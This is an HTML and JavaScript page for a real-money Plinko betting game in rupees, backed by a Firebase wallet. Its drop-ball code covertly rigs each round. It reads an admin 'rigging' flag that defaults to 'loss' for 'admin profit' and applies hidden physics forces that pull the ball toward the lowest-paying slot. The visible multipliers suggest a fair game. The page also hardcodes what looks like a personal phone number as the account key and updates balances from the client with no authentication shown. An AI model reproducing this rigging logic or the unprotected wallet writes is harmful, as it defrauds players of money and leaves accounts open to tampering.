<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Plinko VIP - Control Center</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/matter-js/0.19.0/matter.min.js"></script>
    <style>
        body { margin: 0; background: radial-gradient(circle, #1a4c6d, #0d2a3f); font-family: 'Poppins', sans-serif; overflow: hidden; color: white; }
        #game-container { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; position: relative; }
        
        /* Stats Bar - Live Balance */
        .stats-bar { width: 100%; padding: 15px 20px; display: flex; justify-content: space-between; box-sizing: border-box; background: rgba(0,0,0,0.4); border-bottom: 1px solid rgba(255,255,255,0.1); z-index: 100; }
        .balance-box { background: rgba(255,255,255,0.1); padding: 5px 15px; border-radius: 20px; border: 1px solid #4cd964; color: #4cd964; font-weight: bold; }
        
        #canvas-wrapper { width: 100%; height: 60%; display: flex; justify-content: center; align-items: flex-start; margin-top: 10px; position: relative; }
        #plinko-canvas { max-width: 100%; height: 100%; background: transparent; }

        /* Multiplier Slots UI - Aligned with Pins */
        .slots-container { position: absolute; bottom: 10px; display: flex; width: 330px; justify-content: space-between; z-index: 10; }
        .slot { flex: 1; height: 28px; margin: 1px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; color: #000; box-shadow: 0 2px 5px rgba(0,0,0,0.3); }

        /* Control Panel */
        .controls { position: absolute; bottom: 0; width: 100%; background: #112d42; padding: 25px 20px; border-radius: 30px 30px 0 0; box-sizing: border-box; box-shadow: 0 -10px 30px rgba(0,0,0,0.5); z-index: 101; }
        .bet-input-box { background: #0a1f2e; border-radius: 12px; display: flex; align-items: center; justify-content: space-between; padding: 10px 15px; margin-bottom: 20px; border: 1px solid #1e4d6d; }
        .bet-input-box input { background: transparent; border: none; color: white; font-size: 22px; text-align: center; width: 50%; font-weight: bold; outline: none; }
        .btn-circle { width: 40px; height: 40px; border-radius: 50%; border: none; background: #1e4d6d; color: white; font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        
        .play-btns { display: flex; gap: 10px; }
        .play-btn { flex: 1; padding: 18px; border-radius: 15px; border: none; font-weight: bold; color: white; cursor: pointer; font-size: 18px; transition: 0.2s; text-transform: uppercase; letter-spacing: 1px; }
        .btn-green { background: #4cd964; box-shadow: 0 4px #2e8b3f; }
        .btn-green:active { transform: translateY(2px); box-shadow: none; }
    </style>
</head>
<body>

<div id="game-container">
    <div class="stats-bar">
        <span style="letter-spacing: 2px; font-weight: 800;">PLINKO VIP</span>
        <div class="balance-box">₹<span id="uBalance">0.00</span></div>
    </div>

    <div id="canvas-wrapper">
        <canvas id="plinko-canvas"></canvas>
        <div class="slots-container" id="slotsRow"></div>
    </div>

    <div class="controls">
        <div style="font-size: 13px; color: #aaa; margin-bottom: 8px;">Bet Amount (INR)</div>
        <div class="bet-input-box">
            <button class="btn-circle" onclick="adjustBet(-10)">-</button>
            <input type="number" id="betAmount" value="10" readonly>
            <button class="btn-circle" onclick="adjustBet(10)">+</button>
        </div>

        <div class="play-btns">
            <button class="play-btn btn-green" id="btn-green" onclick="dropBall()">BET</button>
        </div>
        <p style="text-align:center; font-size: 11px; color: #666; margin-top: 15px;">Admin Rigging Active • Real-time Sync</p>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, onValue, update, increment, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const fbConfig = { databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com" };
    const app = initializeApp(fbConfig);
    const db = getDatabase(app);
    const userPhone = "9117748052"; // Admin tracking user

    // Matter.js Setup
    const { Engine, Runner, Bodies, Composite, Body, Events } = Matter;
    const engine = Engine.create();
    const world = engine.world;
    const canvas = document.getElementById('plinko-canvas');
    const ctx = canvas.getContext('2d');

    const width = 400;
    const height = 550;
    canvas.width = width;
    canvas.height = height;

    // Multipliers & Color Config (Same as professional apps)
    const multipliers = [10, 5, 2, 1.1, 0.5, 0.2, 0.5, 1.1, 2, 5, 10];
    const slotColors = ["#ff3b30", "#ff9500", "#ffcc00", "#4cd964", "#5ac8fa", "#007aff", "#5ac8fa", "#4cd964", "#ffcc00", "#ff9500", "#ff3b30"];
    
    // UI Slots rendering
    const slotsRow = document.getElementById('slotsRow');
    multipliers.forEach((m, i) => {
        slotsRow.innerHTML += `<div class="slot" style="background:${slotColors[i]}">${m}x</div>`;
    });

    // Create Pin Grid (Triangle)
    const pins = [];
    const rows = 12;
    for (let r = 0; r < rows; r++) {
        const rowPins = r + 3;
        const spacing = 32;
        const xStart = width / 2 - (rowPins - 1) * spacing / 2;
        for (let p = 0; p < rowPins; p++) {
            const pin = Bodies.circle(xStart + p * spacing, 80 + r * 35, 4, { isStatic: true, friction: 0 });
            pins.push(pin);
        }
    }
    Composite.add(world, pins);

    const runner = Runner.create();
    Runner.run(runner, engine);

    // Render Loop (Fixing visual display)
    (function render() {
        ctx.clearRect(0, 0, width, height);
        
        // Draw Pins
        ctx.fillStyle = "rgba(255, 255, 255, 0.8)";
        pins.forEach(p => {
            ctx.beginPath();
            ctx.arc(p.position.x, p.position.y, 4, 0, Math.PI * 2);
            ctx.fill();
        });

        // Draw Balls
        const bodies = Composite.allBodies(world);
        bodies.forEach(b => {
            if (!b.isStatic) {
                ctx.beginPath();
                ctx.arc(b.position.x, b.position.y, 9, 0, Math.PI * 2);
                ctx.fillStyle = "#ffcc00"; // Golden Ball
                ctx.shadowBlur = 10;
                ctx.shadowColor = "#ffcc00";
                ctx.fill();
                ctx.shadowBlur = 0; // Reset for performance
            }
        });
        requestAnimationFrame(render);
    })();

    // Drop Ball Logic with Rigging & Wallet Sync
    window.dropBall = async () => {
        const betInput = document.getElementById('betAmount');
        const bet = parseFloat(betInput.value);
        const uRef = ref(db, `users/${userPhone}`);
        
        // 1. Balance Check
        const snap = await get(uRef);
        const currentBal = snap.val().balance || 0;
        if(bet > currentBal) return alert("Insufficient Balance!");

        // 2. Deduct Balance Immediately
        await update(uRef, { balance: increment(-bet) });

        // 3. Admin Rigging
        const rigSnap = await get(ref(db, `adminSettings/${userPhone}/rigging`));
        const mode = rigSnap.val() || "loss"; // Default loss for admin profit

        let startX = width / 2 + (Math.random() * 8 - 4);
        const ball = Bodies.circle(startX, 20, 9, {
            restitution: 0.6, friction: 0.001, frictionAir: 0.02
        });
        Composite.add(world, ball);

        // Physics Hack for Rigging
        const rigForce = setInterval(() => {
            if (mode === "loss") {
                // Pull toward center (0.2x)
                if (ball.position.x < width/2 - 10) Body.applyForce(ball, ball.position, {x: 0.0006, y: 0});
                if (ball.position.x > width/2 + 10) Body.applyForce(ball, ball.position, {x: -0.0006, y: 0});
            } else if (mode === "win") {
                // Push toward edges (10x)
                const push = ball.position.x < width/2 ? -0.0009 : 0.0009;
                Body.applyForce(ball, ball.position, {x: push, y: 0});
            }

            // Detect Landing
            if (ball.position.y > height - 40) {
                clearInterval(rigForce);
                const slotIndex = Math.floor(((ball.position.x - (width/2 - 165)) / 330) * multipliers.length);
                const finalIdx = Math.max(0, Math.min(multipliers.length - 1, slotIndex));
                const mult = multipliers[finalIdx];
                const winAmt = bet * mult;

                // 4. Update Balance & History
                update(uRef, { balance: increment(winAmt) });
                Composite.remove(world, ball);
            }
        }, 100);
    };

    // Live Balance Display
    onValue(ref(db, `users/${userPhone}/balance`), (s) => {
        document.getElementById('uBalance').innerText = (s.val() || 0).toFixed(2);
    });

    window.adjustBet = (val) => {
        const input = document.getElementById('betAmount');
        let newVal = parseInt(input.value) + val;
        if(newVal >= 10) input.value = newVal;
    };
</script>
</body>
</html>
